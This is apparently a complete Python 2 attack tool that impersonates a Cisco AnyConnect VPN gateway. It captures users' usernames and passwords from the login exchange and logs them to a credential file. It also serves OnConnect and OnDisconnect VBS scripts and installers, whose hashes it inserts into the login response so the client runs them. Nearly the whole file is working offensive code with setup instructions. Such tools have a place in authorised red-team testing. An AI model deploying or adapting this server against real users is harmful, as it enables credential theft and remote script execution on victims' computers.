#!/usr/bin/env python

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
try:
	from OpenSSL.crypto import load_certificate, FILETYPE_PEM
except:
	print("[-] Python2 OpenSSL not installed, try:\n\nsudo apt-get update\nsudo apt install python-pip\nsudo pip2 install pyOpenSSL\n")
	quit()

import select
import SocketServer
import ssl
import cgi
import datetime
import base64
import socket
import sys
import hashlib
import threading
from time import sleep
import re
import os.path
#You will need to install python2 and openssl for python
#sudo apt-get update
#sudo apt install python2
#sudo apt install python-pip
#sudo pip2 install pyOpenSSL


#######VARIABLES########
#Web server port number
portnum=443


#The location of the SSL certificate
# For testing, generate an SSL cert using: openssl req -new -x509 -keyout pemfile.pem -out pemfile.pem -days 365 -nodes
#If you have a letsencrypt cert, you can just cat privkey.pem and cert.pem into the same pemfile.pem
sslcert = "pemfile.pem"

#Log file - will write out captured creds and activity to here:
logfile = "credlog.txt"

#######END VARIABLES#######




class user():
	def __init__(self, host, username, password, mfa):
			self.host = host
			self.username = username
			self.password = password
			self.mfa = mfa

class S(BaseHTTPRequestHandler):
	def _set_headers(self):
		self.send_response(200)
		

	def do_GET(self):
		try:
			print "GET PATH: " + self.path + " " + self.request_version
			if "index.html" in self.path:
				print "Loading index file"
				
				
				xml = loadtext("index.html")
				self._set_headers()
				self.send_header('Content-type', 'text/html')
				self.end_headers()
				self.wfile.write(xml)
				
			if "Windows" in self.path:
				print "Loading Windows file"
		
				xml = loadtext("Windows")
				self._set_headers()
				self.send_header('Content-type', 'text/html')
				self.end_headers()
				self.wfile.write(xml)
				
			if "vpndownloader" in self.path:
				print "Serving vpndownloader file"
				self.send_response(200)
				self.send_header("Content-type", "application/octet-stream")
				self.end_headers()
				fileObj = open("files/vpndownloader.exe","rb")
				
				exe = fileObj.read()
				
				self.wfile.write(exe)
			
			if "core-vpn-webdeploy" in self.path:
				print "Serving pkg update file"
				self.send_response(200)
				self.send_header("Content-type", "application/octet-stream")
				self.end_headers()
				fileObj = open("files/anyconnect-win-4.9.04053-core-vpn-webdeploy-k9.exe","rb")
				fileObj = open("files/anyconnect-win-4.5.04029-core-vpn-predeploy-k9.msi","rb")
				exea = fileObj.read()
				
				self.wfile.write(exea)
				
	
			if "profile_test" in self.path:
							print "Serving profile file"
							self.send_response(200)
							self.send_header("Content-type", "application/octet-stream")
							self.end_headers()
							#fileObj = open("files/anyconnect-win-4.9.04053-core-vpn-webdeploy-k9.exe","rb")
							fileObj = open("files/profile_test.xml","rb")
							exea = fileObj.read()
	
							self.wfile.write(exea)
	
			if "CSCOSSLC" in self.path:
							print "Serving appdata update file"
							self.send_response(200)
							self.send_header("Content-type", "application/octet-stream")
							self.end_headers()
							#fileObj = open("files/anyconnect-win-4.9.04053-core-vpn-webdeploy-k9.exe","rb")
							fileObj = open("files/tools-anyconnect-win-4.8.03036-profileeditor-k9.msi","rb")
							exea = fileObj.read()
	
							self.wfile.write(exea)
	
			if "OnDisconnect" in self.path:
						try:
							print "Serving OnDisconnect file"
							self.send_response(200)
							self.send_header("Content-type", "application/octet-stream")
							self.end_headers()
							#fileObj = open("files/anyconnect-win-4.9.04053-core-vpn-webdeploy-k9.exe","rb")
							fileObj = open("files/OnDisconnect.vbs","rb")
							exea = fileObj.read()
	
							self.wfile.write(exea)
						except:
							print "OnDisconnect file not present"					
	
			if "OnConnect" in self.path:
						try:	
							print "Serving OnConnect file"
							self.send_response(200)
							self.send_header("Content-type", "application/octet-stream")
							self.end_headers()
							#fileObj = open("files/anyconnect-win-4.9.04053-core-vpn-webdeploy-k9.exe","rb")
							fileObj = open("files/OnConnect.vbs","rb")
							exea = fileObj.read()
	
							self.wfile.write(exea)
						except:
							print "OnConnect file not present"		   
	
	
				
			else:
				print "Invalid Path " + self.path
				
		except Exception as e:
			self._set_headers()
			self.wfile.write("<html><body><h1>Hello World</h1></body></html>")



	def _connect_to(self, netloc, soc):
		i = netloc.find(':')
		if i >= 0:
			host_port = netloc[:i], int(netloc[i+1:])
		else:
			host_port = netloc, 80
		print "Handling CONNECT using loopback socket at " +  str(host_port[0]) + ":" +  str(host_port[1])
		try: soc.connect(host_port)
		except socket.error, arg:
			try: msg = arg[1]
			except: msg = arg
			self.send_error(404, msg)
			return 0
		return 1





	def do_CONNECT(self):
		print "Handling CONNECT for " + self.path
		soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			if self._connect_to("127.0.0.1:9999", soc):
				self.wfile.write("HTTP/1.1 200 OK\r\n")
				self.wfile.write("X-CSTP-Version: 1\r\n")
				self.wfile.write("X-CSTP-Protocol: Copyright (c) 2004 Cisco Systems, Inc.\r\n")
				self.wfile.write("X-CSTP-Address: 192.168.59.128\r\n")
				self.wfile.write("X-CSTP-Netmask: 255.255.255.0\r\n")
				self.wfile.write("X-CSTP-Hostname: 192.168.49.159\r\n")
				self.wfile.write("X-CSTP-Lease-Duration: 1209600\r\n")
				self.wfile.write("X-CSTP-Session-Timeout: none\r\n")
				self.wfile.write("X-CSTP-Session-Timeout-Alert-Interval: 60\r\n")
				self.wfile.write("X-CSTP-Session-Timeout-Remaining: none\r\n")
				self.wfile.write("X-CSTP-Idle-Timeout: 1800\r\n")
				self.wfile.write("X-CSTP-DNS: 8.8.8.8\r\n")
				self.wfile.write("X-CSTP-Disconnected-Timeout: 1800\r\n")
				self.wfile.write("X-CSTP-Split-Include: 192.168.59.0/255.255.255.0\r\n")
				self.wfile.write("X-CSTP-Keep: false\r\n")
				self.wfile.write("X-CSTP-Tunnel-All-DNS: false\r\n")
				self.wfile.write("X-CSTP-DPD: 30\r\n")
				self.wfile.write("X-CSTP-Keepalive: 20\r\n")
				self.wfile.write("X-CSTP-MSIE-Proxy-Lockdown: false\r\n")
				self.wfile.write("X-CSTP-Smartcard-Removal-Disconnect: true\r\n")
				self.wfile.write("X-DTLS-Session-ID: 456F8991F6A915202E1FF2BCE7DC22F3C6791C806311F7CC93E551E97DC1222D\r\n")
				self.wfile.write("X-DTLS-Port: 80\r\n")
				self.wfile.write("X-DTLS-Keepalive: 20\r\n")
				self.wfile.write("X-DTLS-DPD: 30\r\n")
				self.wfile.write("X-CSTP-MTU: 1367\r\n")
				self.wfile.write("X-DTLS-MTU: 1390\r\n")
				self.wfile.write("X-DTLS12-CipherSuite: ECDHE-RSA-AES256-GCM-SHA384\r\n")
				self.wfile.write("X-CSTP-Routing-Filtering-Ignore: false\r\n")
				self.wfile.write("X-CSTP-Quarantine: false\r\n")
				self.wfile.write("X-CSTP-Disable-Always-On-VPN: false\r\n")
				self.wfile.write("X-CSTP-Client-Bypass-Protocol: false\r\n")
				self.wfile.write("X-CSTP-TCP-Keepalive: false")
				self.end_headers()
				self.wfile.write("\r\n")
				self._read_write(soc, 300)
		finally:
			soc.close()
			self.connection.close()


	def _read_write(self, soc, max_idling=20, local=False):
		iw = [self.connection, soc]
		local_data = ""
		ow = []
		count = 0
		while 1:
			count += 1
			(ins, _, exs) = select.select(iw, ow, iw, 1)
			if exs: break
			if ins:
				for i in ins:
					if i is soc: out = self.connection
					else: out = soc
					data = i.recv(8192)
					if data:
						if local: local_data += data
						else: out.send(data)
						count = 0
			if count == max_idling: break
		
		if local: return local_data
		return None

	def do_HEAD(self):
		self._set_headers()
		
	def do_POST(self):
	
		length = int(self.headers.getheader('content-length', 0))
		body = self.rfile.read(length)
		#Pre-login POST
		if "init" in body:
			print "Sending INIT"
			self.send_response(200)
			self.send_header('Content-type', 'text/html')
			#X-Aggregate-Auth: 1
			self.send_header('X-Aggregate-Auth', '1')
			self.end_headers()
			xml = loadtext("preloginxml")
			xml = vpnreplace(xml, vpnname)
			self.wfile.write(xml)
		
		#Login POST
		if "type=\"auth-reply\"" in body:
			username = re.search('<username>(.*)</username>', body)
			password = re.search('<password>(.*)</password>', body)
			logthis("\r\n=====================\r\nUser: " + username.group(1) + "\r\nPassword: " +  password.group(1) + "\r\n=====================")
			print "Sending auth reply"
			self.send_response(200)
			self.send_header('Content-type', 'text/html')
			#X-Aggregate-Auth: 1
			self.send_header('X-Aggregate-Auth', '1')
			self.end_headers()
			xml = loadtext("loginxml")
			xml = matchreplace(xml)
			#Do the find/replace for the cert hash and any changes to profile
			self.wfile.write(xml)	
			
		else:
			print "Unknown request"
					#self.wfile.write("<html><body><h1>Hello World</h1></body></html>")	


def matchreplace(loginxml):

	certhash = getPemhash("pemfile.pem")
	profilehash = sha1hash("files/profile_test.xml")
	vbshash = sha1hash("files/OnDisconnect.vbs")
	vbshashtwo = sha1hash("files/OnConnect.vbs")
	print "Replacing certificate thumbprint with: " + certhash
	loginxml = loginxml.replace('###SERVERCERT###', certhash)
	loginxml = loginxml.replace('###PROFILEHASH###', profilehash)
	try:
		loginxml = loginxml.replace('###VBSHASH###', vbshash)
	except:
		print "Script not present"
	try:
		loginxml = loginxml.replace('###VBSHASHTWO###', vbshashtwo)
	except:
		print "Script not present"
	print "Replacing profile hash with: " + profilehash
	print "Replacing VBS hash with: " + vbshash
	return loginxml

def vpnreplace(preloginxml, vpnname):
		print("Replacing vpn name")
		preloginxml = preloginxml.replace('###VPNNAME###',vpnname)
		preloginxml = preloginxml.replace('###VPNNAME###',vpnname)
		return preloginxml


def sha1hash(filename):
		try:
			sha1sum = hashlib.sha1()
			with open(filename, 'rb') as source:
					block = source.read(2**16)
					while len(block) != 0:
							sha1sum.update(block)
							block = source.read(2**16)
			return sha1sum.hexdigest().upper()
		except:
			return ""

def loopbacksocket():
		socksize = 1024
		sock = socket.socket()
		sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		sock.bind(("127.0.0.1",9999))
		sock.listen(1)
		print "Started loopback listener for CONNECT"

		while True:
				print("Now listening...\n")
				conn, addr = sock.accept()
				print 'New connection from %s:%d' % (addr[0], addr[1])
				data = conn.recv(socksize)
				conn.close()



def run(server_class=HTTPServer, handler_class=S, port=portnum):

	if not os.path.isfile('pemfile.pem'):
				print("Pem file does not exist, your certificate should be pemfile.pem in the same directory as this script")
				quit()


	try:
		print("Using VPN name of " + sys.argv[1])
		global vpnname 
		vpnname = sys.argv[1]
	except:
		print("\n[-] Supply a VPN name as the argument. e.g. sudo python2 droppedconnection.py test-vpn")
		quit()
	th = threading.Thread(target=loopbacksocket)
	th.daemon = True
	th.start()
	server_address = ('', port)
	httpd = server_class(server_address, handler_class)
	httpd.socket = ssl.wrap_socket (httpd.socket, server_side=True,
								certfile=sslcert)
	#logthis('Starting https server...')
	httpd.serve_forever()


def getPemhash(filename):
		cert_file_string = open(filename, "rb").read()
		cert = load_certificate(FILETYPE_PEM, cert_file_string)
		sha1_fingerprint = cert.digest("sha1")
		return sha1_fingerprint.replace(':','')


	
def loadtext(filename):
	with open('files/' + filename) as f:
		data = f.read().replace('\n', '')
	return data




def logthis(message):
	stamp = datetime.datetime.now()
	logstring = "%s : %s" % (stamp, message)
	print logstring	
	with open(logfile, "a") as f:
		f.write(logstring + "\r\n")	

if __name__ == "__main__":
		run()
